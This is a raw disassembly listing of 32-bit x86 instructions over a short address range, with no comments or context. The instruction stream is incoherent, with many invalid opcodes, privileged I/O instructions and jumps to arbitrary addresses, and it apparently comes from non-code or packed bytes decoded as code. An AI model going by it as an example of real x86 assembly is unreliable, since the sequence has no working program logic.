  4128f8:	inc    ebp
  4128f9:	or     DWORD PTR [ebx],ebx
  4128fb:	pop    ebp
  4128fc:	out    dx,al
  4128fd:	aaa    
  4128fe:	pop    ds
  4128ff:	add    bl,BYTE PTR [edx-0x42]
  412902:	ins    DWORD PTR es:[edi],dx
  412903:	sbb    ch,dh
  412905:	shr    BYTE PTR [eax],1
  412907:	dec    ebp
  412908:	sub    DWORD PTR [edi],ebx
  41290a:	scas   al,BYTE PTR es:[edi]
  41290b:	stos   DWORD PTR es:[edi],eax
  41290c:	mov    esi,0x19d7eebe
  412911:	xchg   ebx,eax
  412912:	cmp    eax,0x6271ba03
  412917:	les    eax,FWORD PTR [ebx]
  412919:	jbe    0x412958
  41291b:	and    BYTE PTR [edx+0x1061402c],ah
  412921:	push   eax
  412922:	add    eax,0xcad353fc
  412927:	mov    dl,0xb6
  412929:	sbb    BYTE PTR [eax-0x40cee848],ch
  41292f:	mov    al,0xcb
  412931:	jmp    0xb3975e1f
  412936:	arpl   WORD PTR [eax-0x129e7251],dx
  41293c:	int    0x43
  41293e:	jmp    0x92fc:0xad783712
  412945:	mov    BYTE PTR [ebx-0x2a],dh
  412948:	fidiv  DWORD PTR [esi+0x2e389007]
  41294e:	clc    
  41294f:	cmp    dh,BYTE PTR ds:0xe50c8bf6
  412955:	add    dh,BYTE PTR [esp+edx*1]
  412958:	loopne 0x4129c2
  41295a:	push   ss
  41295b:	and    ah,ah
  41295d:	fmul   QWORD PTR [ecx-0xa]
  412960:	int    0x4d
  412962:	ds ins DWORD PTR es:[edi],dx
  412964:	jae    0x412986
  412966:	repz sub ah,BYTE PTR [eax]
  412969:	adc    BYTE PTR [edx-0x15d07d2d],dh
  41296f:	and    al,0x30
  412971:	mov    BYTE PTR [edx*2-0x163203b6],al
  412978:	cmp    al,BYTE PTR [ecx-0x11a95003]
  41297e:	ins    BYTE PTR es:[edi],dx
  41297f:	or     eax,0xf44d7c55
  412984:	in     eax,dx
  412985:	pop    ebx
  412986:	(bad)  
  412987:	aam    0xad
  412989:	and    ebp,DWORD PTR [ebp+0x79]
  41298c:	push   ss
  41298d:	or     BYTE PTR [edx-0x6f],cl
  412990:	xor    DWORD PTR [esi-0x474c9638],ecx
  412996:	shl    BYTE PTR [edi-0x39],0xfd
  41299a:	lahf   
  41299b:	sub    al,0x17
  41299d:	lahf   
  41299e:	out    0xa9,al
  4129a0:	mov    edi,0x78efe037
  4129a5:	scas   al,BYTE PTR es:[edi]
  4129a6:	retf   
  4129a7:	addr16 xchg esp,eax
  4129a9:	adc    al,0x15
  4129ab:	pushf  
  4129ac:	clc    
  4129ad:	ins    DWORD PTR es:[edi],dx
  4129ae:	cmp    eax,0x8d333b19
  4129b3:	inc    edi
  4129b4:	xor    DWORD PTR [ebx+edx*2],esi
  4129b7:	loopne 0x412953
  4129b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129ba:	outs   dx,BYTE PTR ds:[esi]
  4129bb:	mov    ebp,0xf21871db
  4129c0:	push   esp
  4129c1:	(bad)  
  4129c2:	leave  
  4129c3:	repz fild DWORD PTR ds:0x553b1101
  4129ca:	stos   DWORD PTR es:[edi],eax
  4129cb:	sub    DWORD PTR [esi],edi
  4129cd:	xchg   ebp,eax
  4129ce:	fsub   st,st(5)
  4129d0:	or     BYTE PTR [edx+0x20],dl
  4129d3:	scas   al,BYTE PTR es:[edi]
  4129d4:	mov    esp,0x5fc955ff
  4129d9:	pop    edi
  4129da:	jp     0x4129ac
  4129dc:	xor    eax,DWORD PTR [ebp-0x37]
  4129df:	imul   BYTE PTR [esi+0x4b]
  4129e2:	xchg   ebp,eax
  4129e3:	ror    BYTE PTR [eax+edi*1],1
  4129e6:	rcr    BYTE PTR [ebp-0x58],cl
  4129e9:	nop
  4129ea:	add    BYTE PTR [ecx+0x8],cl
  4129ed:	icebp  
  4129ee:	dec    edx
  4129ef:	mov    DWORD PTR [ecx-0x7d187786],eax
  4129f5:	pop    esp
  4129f6:	iret   
  4129f7:	and    al,0x8a
  4129f9:	push   ebp
  4129fa:	and    BYTE PTR [ebx-0xe5fd620],0x54
  412a01:	sub    eax,0x6b74b077
  412a06:	adc    eax,edx
  412a08:	xor    ecx,ebx
  412a0a:	ret    
  412a0b:	mov    ebx,0x91ff6aff
  412a10:	mov    ds:0xa1b8f1b2,eax
  412a15:	daa    
  412a16:	xor    BYTE PTR [ecx+0x4d],bh
  412a19:	jno    0x4129d6
  412a1b:	mov    bl,ch
  412a1d:	js     0x4129bc
  412a1f:	sub    BYTE PTR [ebp+0x3b],cl
  412a22:	not    esp
  412a24:	std    
  412a25:	cmp    esp,DWORD PTR [ecx+eax*2+0xd]
  412a29:	in     al,dx
  412a2a:	pop    esp
  412a2b:	cld    
  412a2c:	cmp    edx,DWORD PTR [edi-0x437258b2]
  412a32:	pop    ebx
  412a33:	scas   al,BYTE PTR es:[edi]
  412a34:	int    0xd4
  412a36:	ins    DWORD PTR es:[edi],dx
  412a37:	loop   0x412a26
  412a39:	ja     0x4129ca
  412a3b:	(bad)  
  412a3c:	leave  
  412a3d:	cdq    
  412a3e:	daa    
  412a3f:	inc    esi
  412a40:	(bad)  
  412a41:	and    BYTE PTR [edi+ebx*4-0x51e6a891],ah
  412a48:	repnz (bad) 
  412a4a:	adc    ebx,ecx
  412a4c:	cwde   
  412a4d:	mov    dl,0xa3
  412a4f:	sub    ah,BYTE PTR [ecx]
  412a51:	shl    BYTE PTR [edx-0x613c94b5],cl
  412a57:	mov    DWORD PTR [ebx+edx*8-0x78390794],ecx
  412a5e:	xchg   esi,eax
  412a5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a60:	stos   DWORD PTR es:[edi],eax
  412a61:	xchg   ebp,eax
  412a62:	popa   
  412a63:	inc    edx
  412a64:	mov    al,ah
  412a66:	sub    al,0x98
  412a68:	sub    al,0x28
  412a6a:	in     al,0xee
  412a6c:	(bad)  
  412a6e:	rol    esi,0xcd
  412a71:	lock cwde 
  412a73:	aad    0x6a
  412a75:	sbb    ch,bl
  412a77:	add    BYTE PTR [edi-0x47],0xb5
  412a7b:	ror    BYTE PTR [ecx],0x5c
  412a7e:	sub    al,0x2f
  412a80:	sub    eax,0x9b105e3b
  412a85:	xlat   BYTE PTR ds:[ebx]
  412a86:	sub    ebx,DWORD PTR [ebp+0x4a2d4311]
  412a8c:	inc    esi
  412a8d:	imul   DWORD PTR [esi-0x73]
  412a90:	adc    DWORD PTR [eax-0x109cb00f],ebp
  412a96:	cmc    
  412a97:	mov    ebx,DWORD PTR [edi]
  412a99:	repnz inc esi
  412a9b:	sahf   
  412a9c:	xchg   edi,eax
  412a9d:	das    
  412a9e:	stc    
  412a9f:	add    al,0xd
  412aa1:	(bad)  
  412aa2:	cwde   
  412aa3:	pop    ebp
  412aa4:	(bad)  
  412aa5:	ins    DWORD PTR es:[edi],dx
  412aa6:	ins    BYTE PTR es:[edi],dx
  412aa7:	sub    bl,BYTE PTR [ebx]
  412aa9:	push   esi
  412aaa:	mov    eax,0x1ea20b2b
  412aaf:	cmp    al,0x50
  412ab1:	imul   ebp,ebx,0xffffff87
  412ab4:	gs inc ebp
  412ab6:	sbb    eax,0xa80d86ff
  412abb:	or     al,al
  412abd:	inc    ebp
  412abe:	popf   
  412abf:	out    0x67,al
  412ac1:	icebp  
  412ac2:	imul   edi,ebx,0x58
  412ac5:	fist   WORD PTR [edx-0x1baef355]
  412acb:	icebp  
  412acc:	xchg   edi,eax
  412acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ace:	shl    DWORD PTR [edi],cl
  412ad0:	(bad)  
  412ad1:	popf   
  412ad2:	inc    esp
  412ad3:	loop   0x412b50
  412ad5:	pusha  
  412ad6:	mov    edx,0x5d9aad73
  412adb:	std    
  412adc:	push   es
  412add:	leave  
  412ade:	addr16 sti 
  412ae0:	push   eax
  412ae1:	rcl    al,1
  412ae3:	add    BYTE PTR [eax+0x189757b6],0x89
  412aea:	lahf   
  412aeb:	pop    es
  412aec:	push   edi
  412aed:	repnz pop edx
  412aef:	add    al,0x7f
  412af1:	mov    ebp,0x2b6ad2fe
  412af6:	adc    eax,0xac01e610
  412afb:	jno    0x412b68
  412afd:	dec    eax
  412afe:	sub    bh,BYTE PTR [edx+0x52]
  412b01:	(bad)  
  412b02:	loope  0x412b62
  412b04:	mov    DWORD PTR [ecx],esi
  412b06:	out    0xef,al
  412b08:	jp     0x412b72
  412b0a:	xor    al,0x11
  412b0c:	into   
  412b0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b0e:	push   esp
  412b0f:	fs aas 
  412b11:	push   ecx
  412b12:	das    
  412b13:	dec    edi
  412b14:	mov    ds:0xcf742ad0,al
  412b19:	imul   esp,DWORD PTR [eax],0xffffffe7
  412b1c:	int    0xce
  412b1e:	or     al,0xe8
  412b20:	push   esp
  412b21:	(bad)  
  412b22:	jecxz  0x412b37
  412b24:	or     dh,BYTE PTR [edx]
  412b26:	repz or DWORD PTR [ebx],edi
  412b29:	cmp    al,0xf8
  412b2b:	scas   eax,DWORD PTR es:[edi]
  412b2c:	in     al,0x98
  412b2e:	jmp    0x412b05
  412b30:	arpl   WORD PTR [esi-0x1b225c3c],cx
  412b36:	or     ch,BYTE PTR [edx+0x75010f58]
  412b3c:	mov    al,ds:0x36ad0fdc
  412b41:	push   ecx
  412b42:	cmp    ch,BYTE PTR [ebp+0x77bf3b34]
  412b48:	and    eax,0x84831d33
  412b4d:	mov    dh,0xe
  412b4f:	push   edx
  412b50:	js     0x412bbe
  412b52:	fist   WORD PTR [edx]
  412b54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b55:	mov    DWORD PTR [edi-0x7d],edi
  412b58:	stos   DWORD PTR es:[edi],eax
  412b59:	jns    0x412b7e
  412b5b:	inc    ebp
  412b5c:	out    dx,al
  412b5d:	in     al,dx
  412b5e:	dec    esp
  412b5f:	xchg   edx,eax
  412b60:	aas    
  412b61:	call   0xd00e:0xa25713da
  412b68:	sti    
  412b69:	int3   
  412b6a:	mov    eax,0x7519f540
  412b6f:	shl    edx,0xf9
  412b72:	xchg   ecx,eax
  412b73:	jge    0x412b1c
  412b75:	jmp    0x412b08
  412b77:	push   edi
  412b78:	or     eax,0xeb996f22
  412b7d:	mov    dh,0x96
  412b7f:	lahf   
  412b80:	cmp    DWORD PTR [ebp+0x3f82d535],esp
  412b86:	jg     0x412be8
  412b88:	jo     0x412b7b
  412b8a:	(bad)  
  412b8b:	push   ds
  412b8c:	sbb    DWORD PTR [ecx-0x79e57399],ecx
  412b92:	add    al,0xb4
  412b94:	jbe    0x412be8
  412b96:	lods   al,BYTE PTR ds:[esi]
  412b97:	and    ebp,ecx
  412b99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b9a:	xor    al,BYTE PTR [si-0x75]
  412b9e:	out    0xbc,eax
  412ba0:	ins    DWORD PTR es:[edi],dx
  412ba1:	dec    ebx
  412ba2:	mov    esi,0x9a83bfb6
  412ba7:	pop    edx
  412ba8:	out    dx,al
  412ba9:	cmp    eax,0x9df9b22e
  412bae:	call   0x977:0xe962c4b0
  412bb5:	mov    eax,ds:0x7aa6daeb
  412bba:	daa    
  412bbb:	(bad)  
  412bbc:	icebp  
  412bbd:	dec    esp
  412bbe:	imul   ebx,DWORD PTR [edx],0xffffff8c
  412bc1:	ins    DWORD PTR es:[edi],dx
  412bc2:	fs popa 
  412bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bc5:	psrlq  mm2,mm7
  412bc8:	jmp    WORD PTR ds:0x80eff56a
  412bcf:	mov    al,ds:0xa484b9c6
  412bd4:	call   FWORD PTR [ecx-0x5e]
  412bd7:	push   cs
  412bd8:	popa   
  412bd9:	stos   BYTE PTR es:[edi],al
  412bda:	aaa    
  412bdb:	call   FWORD PTR [edx+0x1]
  412bde:	pusha  
  412bdf:	loope  0x412c00
  412be1:	fisubr DWORD PTR [ebx+0x6f]
  412be4:	mov    dh,0x87
  412be6:	fwait
  412be7:	mov    dl,0xa7
  412be9:	xor    DWORD PTR [edi+0x2],esi
  412bec:	int    0x3b
  412bee:	jo     0x412c1b
  412bf0:	clc    
  412bf1:	sbb    esp,DWORD PTR [ebx+0x3a7d6332]
  412bf7:	dec    edi
  412bf8:	jp     0x412c69
  412bfa:	je     0x412c72
  412bfc:	pop    es
  412bfd:	or     al,BYTE PTR [ebx]
  412bff:	retf   
  412c00:	ins    DWORD PTR es:[edi],dx
  412c01:	adc    BYTE PTR [edx],al
  412c03:	shr    DWORD PTR [edx+edi*8],0x6b
  412c07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c08:	std    
  412c09:	ja     0x412ba8
  412c0b:	mov    esp,0x10e598c7
  412c10:	adc    BYTE PTR [esi],ch
  412c12:	xor    DWORD PTR [edx],edi
  412c14:	jle    0x412be6
  412c16:	fdiv   st(1),st
  412c18:	shl    DWORD PTR [edi+0x703c8931],cl
  412c1e:	imul   DWORD PTR [edx+0x339aa5a3]
  412c24:	(bad)
  412c27:	push   0x8b1849f
  412c2c:	sbb    BYTE PTR [ebx+0x34b8fdb],0x7e
  412c33:	popf   
  412c34:	xor    BYTE PTR [esi+0x6e576a8a],dl
  412c3a:	leave  
  412c3b:	retf   
  412c3c:	pop    ebp
  412c3d:	xor    edi,DWORD PTR [ecx]
  412c3f:	pop    ebp
  412c40:	add    eax,0x85377940
  412c45:	rol    BYTE PTR [edi+0x31],0x17
  412c49:	cmp    ebp,DWORD PTR [edx+eax*8+0x1b]
  412c4d:	pop    edi
  412c4e:	push   ds
  412c4f:	aam    0x57
  412c51:	fwait
  412c52:	jle    0x412c4e
  412c54:	inc    esp
  412c55:	mov    BYTE PTR ds:0x349397d5,bl
  412c5b:	test   DWORD PTR [edx+0x4d],ebx
  412c5e:	xchg   edi,eax
  412c5f:	fwait
  412c60:	test   eax,0x273f6323
  412c65:	int3   
  412c66:	sub    BYTE PTR [edx+0x6c4f4801],cl
  412c6c:	or     al,0x13
  412c6e:	retf   0x57b
  412c71:	test   BYTE PTR [edx-0x673f2b2f],ch
  412c77:	cmp    eax,0xb05b3c22
  412c7c:	and    cl,BYTE PTR [ecx-0x52ad6152]
  412c82:	pusha  
  412c83:	shl    DWORD PTR [edi-0x38c601fe],cl
  412c89:	neg    BYTE PTR [eax+0x7]
  412c8c:	pop    ds
  412c8d:	jg     0x412d0e
  412c8f:	les    ebx,FWORD PTR [edx+0x617679fb]
  412c95:	jl     0x412cba
  412c97:	add    ecx,DWORD PTR [esi+ecx*2]
  412c9a:	or     esi,edi
  412c9c:	push   cs
  412c9d:	daa    
  412c9e:	dec    ebp
  412c9f:	adc    BYTE PTR [esi+0x64],bl
  412ca2:	push   ecx
  412ca3:	jo     0x412cd4
  412ca5:	xchg   DWORD PTR [esp+eiz*2+0x6e87e566],eax
  412cac:	cmp    bl,dl
  412cae:	cli    
  412caf:	cld    
  412cb0:	std    
  412cb1:	mov    eax,0x2d261d69
  412cb6:	inc    esi
  412cb7:	jg     0x412c71
  412cb9:	pop    ebp
  412cba:	sbb    DWORD PTR [ebp-0x6f],ecx
  412cbd:	push   ecx
  412cbe:	or     eax,0x830c4bc9
  412cc3:	xor    eax,0x9e36d693
  412cc8:	sub    edx,DWORD PTR [ebp+eax*8+0x6ac3870]
  412ccf:	push   es
  412cd0:	push   ebp
  412cd1:	cmp    ebp,DWORD PTR [ebp+0x1ccff4d]
  412cd7:	xor    eax,0x17aaa848
  412cdc:	sbb    dl,BYTE PTR [edx]
  412cde:	loope  0x412c83
  412ce0:	cmp    esp,DWORD PTR [ebx+ebp*2+0x6b5b089d]
  412ce7:	mov    dl,0x1e
  412ce9:	bound  ecx,QWORD PTR ds:0x2a93df63
  412cef:	out    0xa5,eax
  412cf1:	cmp    eax,0x8802dd1f
  412cf6:	dec    edx
  412cf7:	hlt    
  412cf8:	mov    al,ds:0xf383dda
  412cfd:	cmc    
  412cfe:	or     cl,BYTE PTR [edi-0x4d87c640]
  412d04:	dec    esi
  412d05:	cmp    al,dl
  412d07:	or     DWORD PTR [eax-0x69],edx
  412d0a:	lods   al,BYTE PTR ds:[esi]
  412d0b:	jmp    0x412ceb
  412d0d:	cmp    eax,0xe200a835
  412d12:	xor    ch,bl
  412d14:	jno    0x412d8a
  412d16:	inc    esp
  412d17:	jnp    0x412d16
  412d19:	adc    eax,0xa5a1e00b
  412d1e:	shl    DWORD PTR [ebx+ecx*4+0x36],0x6a
  412d23:	lahf   
  412d24:	and    dl,BYTE PTR [ebp+0x2]
  412d27:	out    0xaa,eax
  412d29:	lods   al,BYTE PTR ds:[esi]
  412d2a:	adc    al,0x8a
  412d2c:	stos   DWORD PTR es:[edi],eax
  412d2d:	loopne 0x412d3c
  412d2f:	stos   BYTE PTR es:[edi],al
  412d30:	pop    es
  412d31:	push   ds
  412d32:	sbb    dl,ch
  412d34:	(bad)  
  412d35:	popa   
  412d36:	test   BYTE PTR [edi+eax*2+0x7d09666c],ch
  412d3d:	adc    ecx,DWORD PTR [esp+ebx*8]
  412d40:	data16 and ch,BYTE PTR [esi+0x28aaad57]
  412d47:	inc    eax
  412d48:	mov    edi,0xd4efc8d7
  412d4d:	pop    es
  412d4e:	out    0x87,eax
  412d50:	or     esp,eax
  412d52:	loope  0x412d38
  412d54:	sbb    BYTE PTR [edx+edi*4],bl
  412d57:	or     al,0x3c
  412d59:	jge    0x412d4c
  412d5b:	sub    esp,DWORD PTR [ecx]
  412d5d:	retf   0xc082
  412d60:	repnz pop edi
  412d62:	fdiv   DWORD PTR [ecx-0x7d]
  412d65:	push   eax
  412d66:	cmp    al,BYTE PTR [edx]
  412d68:	adc    edx,DWORD PTR [edi]
  412d6a:	and    ebx,DWORD PTR [ebx+0x5ee76f2b]
  412d70:	mov    ds:0x94c14e63,eax
  412d75:	daa    
  412d76:	xchg   ebp,eax
  412d77:	test   BYTE PTR [eax-0x1361410c],cl
  412d7d:	dec    eax
  412d7e:	jecxz  0x412d30
  412d80:	retf   
  412d81:	sub    BYTE PTR [edi],bh
  412d83:	dec    edx
  412d84:	dec    eax
  412d85:	push   ebp
  412d86:	int    0x1
  412d88:	sbb    eax,0x4d936ba1
  412d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d8e:	xchg   edx,eax
  412d8f:	push   edi
  412d90:	and    eax,0x64db913f
  412d95:	retf   0x661d
  412d98:	ins    BYTE PTR es:[edi],dx
  412d99:	sbb    eax,DWORD PTR [ecx]
  412d9b:	push   edx
  412d9c:	into   
  412d9d:	adc    eax,0x3b03eea3
  412da2:	add    DWORD PTR [eax],0xffffffec
  412da5:	cmp    ch,bh
  412da7:	push   cs
  412da8:	inc    ebp
  412da9:	stos   DWORD PTR es:[edi],eax
  412daa:	cmp    DWORD PTR [eax-0x1690de39],edx
  412db0:	inc    ebp
  412db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412db2:	mov    edx,0x645cf1ea
  412db7:	fs int3 
  412db9:	jb     0x412d90
  412dbb:	dec    ecx
  412dbc:	adc    cl,BYTE PTR [ebp-0x78]
  412dbf:	stos   DWORD PTR es:[edi],eax
  412dc0:	scas   al,BYTE PTR es:[edi]
  412dc1:	and    eax,0x280cb322
  412dc6:	ss scas eax,DWORD PTR es:[edi]
  412dc8:	push   ebp
  412dc9:	iret   
  412dca:	push   ebx
  412dcb:	mov    eax,0x7f9375b8
  412dd0:	cmp    al,0x7d
  412dd3:	xor    ax,0x5fc9
  412dd7:	(bad)  [edi-0x22d78361]
  412ddd:	in     al,0x3f
  412ddf:	cli    
  412de0:	int3   
  412de1:	or     al,0x8b
  412de3:	jb     0x412db2
  412de5:	adc    edx,DWORD PTR [ebx+0x4b]
  412de8:	inc    eax
  412de9:	mov    ebx,0x26caf66a
  412dee:	int    0x26
  412df0:	pop    esp
  412df1:	shl    BYTE PTR [edi-0x461d8375],0xfb
  412df8:	adc    eax,0xfcab2e4b
  412dfd:	test   DWORD PTR [ebp+0x62],esi
  412e00:	xchg   edx,eax
  412e01:	xor    eax,0xec838278
  412e06:	arpl   WORD PTR [esi+0x3b],bx
  412e09:	outs   dx,BYTE PTR ds:[esi]
  412e0a:	inc    ecx
  412e0b:	pop    ebp
  412e0c:	(bad)  
  412e0d:	mov    cl,0x18
  412e0f:	sbb    eax,0x2c7aa297
  412e14:	xchg   ebp,eax
  412e15:	push   esp
  412e16:	ficom  DWORD PTR [ecx]
  412e18:	inc    DWORD PTR ds:0xd5a9c851
  412e1e:	mov    ah,0xb7
  412e20:	mov    ah,0xf2
  412e22:	dec    eax
  412e23:	mov    eax,0x4c67bedc
  412e28:	xchg   BYTE PTR [edx+0x55],al
  412e2b:	mov    ah,0xa4
  412e2d:	xchg   ecx,eax
  412e2e:	scas   al,BYTE PTR es:[edi]
  412e2f:	mov    edi,0x981b3e69
  412e34:	add    al,ch
  412e36:	adc    DWORD PTR [esi],edx
  412e38:	out    0xaf,eax
  412e3a:	sbb    eax,0xb26cb996
  412e3f:	sub    BYTE PTR [eax+0x5247b85a],cl
  412e45:	test   al,0xd9
  412e47:	dec    ebp
  412e48:	xchg   BYTE PTR [esi+0x6a],cl
  412e4b:	dec    esp
  412e4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e4d:	mov    ebp,0x92982f8d
  412e52:	scas   eax,DWORD PTR es:[edi]
  412e53:	push   0x7d
  412e55:	pop    es
  412e56:	popa   
  412e57:	aas    
  412e58:	mov    cl,0xd9
  412e5a:	loop   0x412e83
  412e5c:	mov    ch,0xd0
  412e5e:	sbb    al,0x69
  412e60:	or     al,0xc1
  412e62:	push   edi
  412e63:	or     al,0x68
  412e65:	xor    BYTE PTR [ebp+0xdff48f],al
  412e6b:	fcom   DWORD PTR [ebx-0x28ab776f]
  412e71:	push   edx
  412e72:	dec    ecx
  412e73:	or     edi,DWORD PTR [ebx]
  412e75:	sbb    DWORD PTR [ebx-0x47],edi
  412e78:	sub    al,0x53
  412e7a:	scas   al,BYTE PTR es:[edi]
  412e7b:	shl    BYTE PTR [ebx+0x46],cl
  412e7e:	and    DWORD PTR [edi],ebx
  412e80:	gs je  0x412e10
  412e83:	or     al,0x80
  412e85:	loope  0x412e0d
  412e87:	push   0x2ca21eeb
  412e8c:	dec    ebx
  412e8d:	ret    
  412e8e:	cmp    dl,BYTE PTR [ebx+0x40559ac8]
  412e94:	sub    DWORD PTR [esi],ebp
  412e96:	fiadd  WORD PTR [esi-0x5f0f1667]
  412e9c:	add    ah,BYTE PTR [eax]
  412e9e:	mov    gs,WORD PTR [eax+edi*8-0x70]
  412ea2:	xor    DWORD PTR [ebx-0x56b71fbd],edx
  412ea8:	fwait
  412ea9:	xchg   ecx,eax
  412eaa:	cmc    
  412eab:	cdq    
  412eac:	(bad)  
  412ead:	sbb    DWORD PTR [edx-0xf],eax
  412eb0:	into   
  412eb1:	fxch   st(2)
  412eb3:	mov    eax,ds:0x8b46c904
  412eb8:	lods   eax,DWORD PTR ds:[esi]
  412eb9:	aam    0xc7
  412ebb:	test   BYTE PTR [eax],cl
  412ebd:	cwde   
  412ebe:	ficomp DWORD PTR [esi]
  412ec0:	sbb    ah,BYTE PTR [ebx+0xa6f12f4]
  412ec6:	call   0x61c4:0x8675d07c
  412ecd:	cs cmp al,0x42
  412ed0:	mov    ecx,esi
  412ed2:	out    dx,eax
  412ed3:	push   esi
  412ed4:	mov    edi,0x12dc08d2
  412ed9:	retf   0xc052
  412edc:	push   edx
  412edd:	mov    eax,ebx
  412edf:	cwde   
  412ee0:	mov    bh,BYTE PTR [eax+eax*2+0x3100de37]
  412ee7:	add    ebx,0xf30f6f10
  412eed:	add    BYTE PTR [eax],ch
  412eef:	scas   al,BYTE PTR es:[edi]
  412ef0:	inc    eax
  412ef1:	inc    ecx
  412ef2:	jmp    0xebf88f16
  412ef7:	xor    ebp,DWORD PTR [ebx]
  412ef9:	pandn  mm6,QWORD PTR [edx]
  412efc:	sbb    BYTE PTR [edi-0x25],dl
  412eff:	and    ecx,DWORD PTR [ebx]
  412f01:	fild   QWORD PTR [edx+eax*8]
  412f04:	sbb    edx,DWORD PTR [edx-0x59]
  412f07:	push   ebx
  412f08:	fidivr DWORD PTR [ecx]
  412f0a:	jns    0x412ec6
  412f0c:	push   ebp
  412f0d:	lea    edi,[ebp-0x402e6327]
  412f13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f14:	call   0xa2997810
  412f19:	daa    
  412f1a:	iret   
  412f1b:	out    0xfa,al
  412f1d:	jmp    0x412f90
  412f1f:	dec    esp
  412f20:	or     eax,DWORD PTR [ecx+0x4212305c]
  412f26:	sar    BYTE PTR [edi+ebx*4],0x30
  412f2a:	pop    ds
  412f2b:	les    edi,FWORD PTR [edi-0x80]
  412f2e:	es jnp 0x412f9a
  412f31:	test   al,bl
  412f33:	stc    
  412f34:	arpl   WORD PTR [ebp+0x3ecb36d1],cx
  412f3a:	nop
  412f3b:	repz mov ebx,0x8fc53d6a
  412f41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f42:	aam    0xbd
  412f44:	sar    BYTE PTR [edi+0x4f],0xf1
  412f48:	(bad)  
  412f4a:	out    0x12,al
  412f4c:	dec    esp
  412f4d:	sub    ch,BYTE PTR [edi]
  412f4f:	inc    edx
  412f50:	mov    ecx,0xe40f7db
  412f55:	ins    DWORD PTR es:[edi],dx
  412f56:	stos   DWORD PTR es:[edi],eax
  412f57:	push   esi
  412f58:	inc    ebp
  412f59:	fwait
  412f5a:	loop   0x412f67
  412f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f5d:	mov    ebx,0x3f579e98
  412f62:	add    eax,0xdcba2be2
  412f67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f68:	out    dx,eax
  412f69:	aad    0xe8
  412f6b:	adc    eax,DWORD PTR [ecx-0x2cd1ad26]
  412f71:	rol    ch,1
  412f73:	out    dx,al
  412f74:	push   ds
  412f75:	nop
  412f76:	ret    0x27a2
  412f79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f7a:	add    BYTE PTR [edx],bl
  412f7c:	data16 and cl,BYTE PTR [edx+0x6a]
  412f80:	mov    WORD PTR [edx],es
  412f82:	xchg   ebp,eax
  412f83:	adc    eax,0x7dbf3ba3
  412f88:	push   ecx
  412f89:	add    BYTE PTR [ebx+eiz*4],ah
  412f8c:	int3   
  412f8d:	pop    ebp
  412f8e:	add    BYTE PTR [ecx+0x7c6874ec],ah
  412f94:	mov    al,0x75
  412f96:	(bad)  
  412f97:	and    BYTE PTR [ecx+0x2],ch
  412f9a:	jae    0x412f22
  412f9c:	sbb    edi,DWORD PTR [eax-0x2ada0e6c]
  412fa2:	sbb    DWORD PTR [ecx+0x4c028f6f],ebp
  412fa8:	in     al,0x27
  412faa:	les    esi,FWORD PTR [esp+ebx*1]
  412fad:	xlat   BYTE PTR ds:[ebx]
  412fae:	pusha  
  412faf:	mov    ebx,0xcc38ed7b
  412fb4:	inc    edx
  412fb5:	stos   BYTE PTR es:[edi],al
  412fb6:	je     0x412f74
  412fb8:	aas    
  412fb9:	jle    0x413039
  412fbb:	test   eax,0xd5c21e0d
  412fc0:	ja     0x413029
  412fc2:	mov    cl,0x44
  412fc4:	adc    al,0xa3
  412fc6:	jne    0x413034
  412fc8:	jp     0x412ffa
  412fca:	stc    
  412fcb:	xchg   esi,eax
  412fcc:	mov    dh,0xec
  412fce:	pop    edx
  412fcf:	pop    ss
  412fd0:	jmp    0x412f6e
  412fd2:	push   es
  412fd3:	push   ebx
  412fd4:	ret    0xb244
  412fd7:	inc    esi
  412fd8:	sti    
  412fd9:	add    al,al
  412fdb:	inc    esi
  412fdc:	pop    ebp
  412fde:	(bad)  [edx+ebx*2]
  412fe1:	out    dx,al
  412fe2:	inc    edx
  412fe3:	push   edx
  412fe4:	out    dx,eax
  412fe5:	sti    
  412fe6:	out    dx,eax
  412fe7:	repz in eax,dx
  412fe9:	dec    ebp
  412fea:	leave  
  412feb:	jge    0x412f71
  412fed:	mov    ecx,0x7a59d9be
  412ff2:	dec    esi
  412ff3:	adc    DWORD PTR [eax-0x61],0x7fac321d
  412ffa:	sti    
  412ffb:	cmc    
  412ffc:	mov    dl,0x17
  412ffe:	xchg   edi,ebx
  413000:	stos   BYTE PTR es:[edi],al
  413001:	mov    eax,ds:0x626b92bd
  413006:	repnz adc BYTE PTR [eax],ah
  413009:	not    DWORD PTR [eax+0x7cfc14b1]
  41300f:	ins    BYTE PTR es:[edi],dx
  413010:	push   esi
  413011:	sbb    edi,DWORD PTR [edx+eiz*8+0x5d5207e1]
  413018:	jmp    0x110d:0xb1a9c9fb
  41301f:	add    al,BYTE PTR [ebp+0x1b]
  413022:	lods   al,BYTE PTR ds:[esi]
  413023:	push   es
  413024:	cld    
  413025:	shl    DWORD PTR [bp+si+0x14],0xfa
  41302a:	sbb    al,0x22
  41302c:	out    0xba,eax
  41302e:	mov    ebp,0xd79bd1b9
  413033:	cwde   
  413034:	in     eax,dx
  413035:	xchg   esp,ecx
  413037:	imul   ebx,DWORD PTR ds:0xbb80504e,0xffffff8a
  41303e:	fadd   QWORD PTR [ebp-0x3d]
  413041:	enter  0xd043,0x1a
  413045:	ret    
  413046:	aas    
  413047:	pusha  
  413048:	clc    
  413049:	inc    edi
  41304a:	push   ecx
  41304b:	inc    eax
  41304c:	dec    eax
  41304d:	xor    dl,BYTE PTR [esi]
  41304f:	and    DWORD PTR [ebx+0x2d],esp
  413052:	mov    edx,0x502be596
  413057:	mov    BYTE PTR [ebx-0x4a16e479],0x5
  41305e:	clc    
